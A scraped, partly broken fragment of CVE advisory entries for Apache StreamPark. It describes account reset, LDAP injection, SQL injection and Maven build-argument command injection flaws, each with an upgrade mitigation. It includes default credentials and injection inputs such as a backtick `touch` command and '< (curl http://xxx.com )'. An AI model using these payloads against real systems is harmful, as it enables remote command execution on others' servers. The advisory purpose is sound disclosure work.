      <description>Apache StreamPark 1.0.0 before 2.0.0 When the user successfully logs in, to modify his profile, the username will be passed to the server-layer as a parameter, but not verified whether the user name is the currently logged user and whether the user is legal, This will allow malicious attackers to send any username to modify and reset the account, Users of the affected versions should upgrade to Apache StreamPark 2.0.0 or later.

      <description>Apache StreamPark 1.0.0 to 2.0.0 have a LDAP injection vulnerability.
LDAP Injection is an attack used to exploit web based applications
that construct LDAP statements based on user input. When an
application fails to properly sanitize user input, it's possible to
modify LDAP statements through techniques similar to SQL Injection.
LDAP injection attacks could result in the granting of permissions to
unauthorized queries, and content modification inside the LDAP tree.
This risk may only occur when the user logs in with ldap, and the user
name and password login will not be affected, Users of the affected
versions should upgrade to Apache StreamPark 2.0.0 or later.

      <title>CVE-2024-29737|2024-08-02T01:10:55.460Z -- apache%20software%20foundation -- apache%20streampark%20%28incubating%29</title>

      <description>In streampark, the project module integrates Maven's compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.

Mitigation:

all users should upgrade to 2.1.4

Background info:

Log in to Streampark using the default username (e.g. test1, test2, test3) and the default password (streampark). Navigate to the Project module, then add a new project. Enter the git repository address of the project and input `touch /tmp/success_2.1.2` as the "Build Argument". Note that there is no verification and interception of the special character "`". As a result, you will find that this injection command will be successfully executed after executing the build.

In the latest version, the special symbol ` is intercepted.</description>

Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.

Background:

In the "Project" module, the maven build args  “&lt;” operator causes command injection. e.g : “&lt; (curl  http://xxx.com )” will be executed as a command injection,

Mitigation:

all users should upgrade to 2.1.4,  The "&lt;" operator will blocked。</description>

      <description>In streampark-console the list pages(e.g: application pages), users can sort page by field. This sort field is sent from the front-end to the back-end, and the SQL query is generated using this field. However, because this sort field isn't validated, there is a risk of SQL injection vulnerability. The attacker must successfully log into the system to launch an attack, which may cause data leakage. Since no data will be written, so this is a low-impact vulnerability.

Mitigation:

all users should upgrade to 2.1.4,  Such parameters will be blocked.</description>
